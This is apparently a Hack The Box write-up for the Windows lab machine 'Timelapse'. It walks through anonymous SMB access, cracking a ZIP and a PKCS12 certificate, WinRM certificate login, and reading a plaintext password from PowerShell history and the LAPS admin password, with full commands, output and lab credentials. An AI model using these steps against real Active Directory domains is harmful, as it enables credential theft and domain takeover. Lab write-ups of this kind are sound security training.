# Timelapse

## Overview

A Windows machine releases at 03/26/22 and features:

* Active Directory
* SMB Shares
* LAPS
* LDAP
* Crack Encrypted ZIP and PKCS12
* WinRM Certificate-based Authentication
* PowerShell History

## Reconnaissance

### General Information

* Host name `dc01.timelapse.htb`
* Domain name `timelapse.htb`
* WinRM over https got a _**expired TLS certificate**_

### Port Scanning

* TCP
  * Stealthy scanned
  * Opened ports 53, 88(Kerberos), 135, 139, 389, 5986(WinRM/HTTPs)...
  * Revealing this is a DC, Domain Controller
  * Domain `timelapse.htb0`
* UDP, Top-500
  * 53, 123, 389

### LDAP

* Null bind test _**fails**_

```bash
$ ldapsearch -x -b 'dc=timelapse,dc=htb0'
```

### SMB

*   Got some shares on target

    ```bash
    $ smbclient -U '' --no-pass -L //dc01.timelapse.htb

    		Sharename       Type      Comment
    		---------       ----      -------
    SMB1 disabled -- no workgroup available
    $ smbclient -U '' -L //dc01.timelapse.htb
    Enter WORKGROUP\'s password:

    		Sharename       Type      Comment
    		---------       ----      -------
    		ADMIN$          Disk      Remote Admin
    		C$              Disk      Default share
    		IPC$            IPC       Remote IPC
    		NETLOGON        Disk      Logon server share
    		Shares          Disk
    		SYSVOL          Disk      Logon server share
    SMB1 disabled -- no workgroup available
    ```
* On the `\\dc01.timelapse.htb\Shares` found
  * folder `HelpDesk` containing `LAPS` related document
  * folder `Dev` contains a encrypted file `winrm_backup.zip`
  * `SYSVOL` and `NETLOGON` got access denied

## Initial Access

### Crack ZIP encryption

* Use `zip2john` get the encrypted zip file hash

```bash
$ zip2john winrm_backup.zip > zip.hash
```

* Crack the hash by `john` and get password `supremelegacy`

```bash
──╼ $sudo john -wordlist:/home/htb-jackx8x7x/Desktop/Useful\ Repos/SecLists/Passwords/Leaked-Databases/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-03-28 05:23) 2.857g/s 9924Kp/s 9924Kc/s 9924KC/s surfrox1391..supergau
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Crack PKCS12

* Unzip the zip file get a file `legacyy_dev_auth.pfx` string `legacyy@timelapse.htb`
  * Which is protected by a passphrase
* Crack by `crackpkcs12`

```bash
$sudo crackpkcs12 -d /home/htb-jackx8x7x/Desktop/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt ~/my_data/machine/timelapse/smb/legacyy_dev_auth.pfx

Dictionary attack - Starting 4 threads

*********************************************************
Dictionary attack - Thread 4 - Password found: thuglegacy
*********************************************************
```

### WinRM

We can use this file authenticating with the target over WinRM

*   Extract the private key from the `.pfx` file

    ```bash
    $ openssl pkcs12 -in [yourfile.pfx] -nocerts -out [drlive.key]
    $ openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [drlive.crt]
    ```

```bash
$ evil-winrm -c cert -k key -i <IP> -S
```

## Enumeration

### Current User

* `timelapse\legacyy`
* Privileges
  * `SeMachineAccountPrivilege`
  * `SeIncreaseWorkingSetPrivilege`
* Groups
  * Remote Management Users
  * Pre-Windows 2000 Compatible Access
  * TIMELAPSE\Development

### Active Directory

*   Compuer Accounts

    * **DC01, DB01, WEB01, DEV01**

    ```powershell
    PS C:\> Get-ADComputer -Filter *
    ```
*   Users

    ```powershell
    *Evil-WinRM* PS C:\Users\legacyy\Documents> get-aduser -filter *|select distinguishedname

    distinguishedname
    -----------------
    CN=Administrator,CN=Users,DC=timelapse,DC=htb
    CN=Guest,CN=Users,DC=timelapse,DC=htb
    CN=krbtgt,CN=Users,DC=timelapse,DC=htb
    CN=TheCyberGeek,OU=Admins,OU=Staff,DC=timelapse,DC=htb
    CN=Payl0ad,OU=Admins,OU=Staff,DC=timelapse,DC=htb
    CN=Legacyy,OU=Dev,OU=Staff,DC=timelapse,DC=htb
    CN=Sinfulz,OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb
    CN=Babywyrm,OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb
    CN=svc_deploy,CN=Users,DC=timelapse,DC=htb
    CN=TRX,OU=Admins,OU=Staff,DC=timelapse,DC=htb
    ```

### LAPS

* Check for the LAPS password attribute ms-mcs-admpwd

```powershell
PS C:\> Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=timelapse,DC=htb'
```

## Privilege Escalation

* By list files recursive, found the PowerShell history
*   Alternatively, run the command `Get-PSReadlineOption`

    ```powershel
    PS C:\> gci -recurse -file -force -erraction ignore | ?{<some filter>}
    ```
* And we get the password for user `svc_deploy`
* who is the member of the `LAPS_Readers` group

```PowerShell
*Evil-WinRM* PS C:\Users\legacyy> get-content C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Con*
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

* We can read the local administrator password by

```PowerShell
Evil-WinRM* PS C:\> get-adobject -filter 'objectclass -eq "computer"' -properties ms-mcs-admpwd

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-mcs-admpwd     : Me78u5,z{ml+N4VNl,rl)GxA
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f

```

## Reference

{% embed url="http://vcloud-lab.com/entries/powershell/configure-powershell-winrm-to-use-openssl-generated-self-signed-certificate" %}

{% embed url="https://adsecurity.org/?p=3164" %}

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration" %}
